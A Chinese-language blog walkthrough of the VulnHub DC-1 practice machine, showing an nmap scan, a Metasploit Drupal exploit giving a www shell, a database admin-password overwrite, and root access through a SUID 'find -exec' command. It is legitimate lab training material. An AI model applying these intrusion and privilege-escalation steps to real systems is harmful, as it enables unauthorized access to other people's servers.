
## DC-1
**Author:xingg051**

靶机下载: [vulnhub-DC1](https://www.vulnhub.com/entry/dc-1,292/)

```bash
nmap -sT -sV -p- -T5 x.x.x.x
```

发现22和80端口  
浏览器访问80端口，发现Drupal框架   
搜索漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101204156582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)
尝试利用

```bash
use 4
set rhost x.x.x.x
run 
```

然后就进入了meterpreter
再输入`python -c "import pty;pty.spawn('/bin/bash');"`

就能拿到一个www的shell

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020010120470786.png)

进去之后查看文件发现数据库密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101204754970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)

进入数据库发现了users表的admin字段 密码是加密的!
![](https://img-blog.csdnimg.cn/20200101204840438.png)

drupal有自己的密码生成方式
直接利用网上现成的123456的hash值
在数据库里更新密码字段

```bash
update 表名 set 字段名 = 新内容 where 限定内容
```

再到web页面就能admin登录了
在后台看到了作者给出的提示：-exec
我们继续提权，先上传LinEnum

```bash
upload  LinEnum.sh  ./
chmod +x //增加执行权限
```

运行发现

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101205332585.png)

ind命令是root权限的
那就直接查看root家目录吧

```bash
find /root
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020010120540935.png)

```bash
find /root/thefinalflag.txt -exec cat {} \;    
```

查找文件 -exec 执行后面的命令 {}\;

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200101205531711.png)

提权成功
	
DC1是我做的第一台靶机，还是在看着师傅们的wp下做的，到现在做到了第十台，也算是摸了个入门，回头看当时的记录，明显感觉是在瞎头乱撞，稍微重新整理了一下，截图没法补了，就补了一点过程，师傅们海涵。
欢迎师傅们指点

邮箱:xingg051@163.com
